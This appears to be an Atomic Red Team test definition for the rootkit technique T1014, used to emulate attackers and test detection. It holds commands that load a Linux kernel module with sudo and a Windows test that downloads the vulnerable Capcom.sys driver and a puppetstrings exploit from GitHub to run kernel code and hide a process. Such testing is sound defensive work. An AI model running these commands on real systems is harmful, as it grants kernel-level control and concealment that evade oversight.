---
attack_technique: T1014
display_name: Loadable Kernel Module based Rootkit

atomic_tests:
- name: Loadable Kernel Module based Rootkit
  description: |
    Loadable Kernel Module based Rootkit

  supported_platforms:
    - linux

  input_arguments:
    rootkit_file:
      description: Path To Module
      type: String
      default: Module.ko

  executor:
    name: sh
    command: |
      sudo insmod #{rootkit_file}
- name: Loadable Kernel Module based Rootkit
  description: |
    Loadable Kernel Module based Rootkit

  supported_platforms:
    - linux

  input_arguments:
    rootkit_file:
      description: Path To Module
      type: String
      default: Module.ko

  executor:
    name: sh
    command: |
      sudo modprobe #{rootkit_file}

- name: Windows Signed Driver Rootkit Test
  description: |
    This test exploits a signed driver to execute code in Kernel.
    SHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7
    We leverage the work done here:
    https://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html
    The hash of our PoC Exploit is
    SHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441
    This will simulate hiding a process.
    It would be wise if you only run this in a test environment

  supported_platforms:
    - windows

  input_arguments:
    driver_file:
      description: Path to the vulnerable driver
      type: Path
      default: C:\T1014\Capcom.sys
    driver_url:
      description: URL to retrieve capcom.sys
      type: Url
      default: https://github.com/FuzzySecurity/Capcom-Rootkit/raw/c887fb87b1a1294fc43920d6694868cd7a24eacb/Driver/Capcom.sys
    driver_hash:
      description: File hash of capcom.sys
      type: String
      default: DA6CA1FB539F825CA0F012ED6976BAF57EF9C70143B7A1E88B4650BF7A925E24
    puppetstrings_file:
      description: Path to puppetstrings
      type: Path
      default: C:\T1014\puppetstrings.exe
    puppetstrings_url:
      description: URL to retrieve puppetstrings.exe
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/bin/puppetstrings.exe?raw=true

  dependency_executor_name: powershell
  dependencies: 
    - description: |
        T1012 must have access to #{puppetstrings_file} and #{driver_file}
      prereq_command: | # commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the pre-requisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
        if ((Test-Path "#{driver_file}") -and (Test-Path "#{puppetstrings_file}")) {exit 0} else {exit 1}
      get_prereq_command: | # commands to meet this prerequisite or a message describing how to meet this prereq
        if ((Test-Path "#{driver_file}") -eq $false) {Invoke-WebRequestVerifyHash "#{driver_url}" "#{driver_file}" #{driver_hash}}
        if ((Test-Path "#{puppetstrings_file}") -eq $false) {Invoke-WebRequest "#{puppetstrings_url}" -OutFile "#{puppetstrings_file}"}

  executor:
    name: command_prompt
    command: |
      #{puppetstrings_file} #{driver_file}
